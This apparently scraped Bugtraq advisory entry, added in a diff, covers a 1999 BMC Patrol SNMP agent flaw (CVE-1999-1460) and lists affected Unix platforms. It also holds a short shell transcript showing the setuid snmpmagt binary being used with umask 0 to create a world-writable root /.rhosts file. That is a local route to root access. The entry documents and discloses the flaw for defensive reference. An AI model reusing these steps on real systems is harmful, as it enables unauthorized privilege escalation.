@@ -1,0 +1,231 @@
+#bid525<p><b><span style="font-size: 18pt;">BMC Patrol SNMP Agent File Creation/Permission Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/525/info">info</a><br><a href="http://www.securityfocus.com/bid/525/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/525/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/525/solution">solution</a><br><a href="http://www.securityfocus.com/bid/525/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				525
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-1460<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 14 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by Andrew Alness &lt;alness@gti.net&gt; on July 14, 1999. Parts of the discussion were taken directly from Andrew's BugTraq posting. Graeme Byrnes &lt;graeme_byrnes@bmc.com&gt; a Technical Support Specialist at BMC Software snet fix information
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					BMC Software Patrol 3.2.5 <br/>
+					
+				
+					BMC Software Patrol 3.2.3 <br/>
+					
+				
+					BMC Software Patrol 3.2 <br/>
+<span class="related">
+						
+							-
+						
+						Data General DG/UX 8.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Data General DG/UX 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Digital UNIX 4.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						HP HP-UX 11.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						HP HP-UX 10.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						HP HP-UX 9.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						IBM AIX 4.2.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						IBM AIX 4.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SCO Open Server 5.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SCO Unixware 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sequent Dynix 3.0.17 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sequent Dynix 3.0.12 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SGI IRIX 6.5.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SGI IRIX 6.5 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SGI IRIX 6.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.6_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.5_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.5<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					BMC Software Patrol 3.2.7 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; ls -al snmpmagt<br/>-rwsr-xr-x   1 root       users       185461 Mar  6  1998 snmpmagt*<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; ls -al /.rhosts<br/>/.rhosts not found<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; umask 0<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; snmpmagt yoyoyo /.rhosts<br/><br/>yoyoyo: No such file or directory<br/>snmp bind failure: Address already in use<br/>/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin/snmpmagt: error processing configuration<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; ls -al /.rhosts<br/>-rw-rw-rw-   1 root       users          770 Jul 13 14:42 .rhosts<br/><br/>note: If the file exists, it keeps the same perms and overwrites it<br/>with "i^A" then the result of gethostname() and some whitespace. this<br/>problem is not platform dependent and was tested based on out of box <br/>install on an HP.
+	
+		<ul>
+</ul>
+</div>
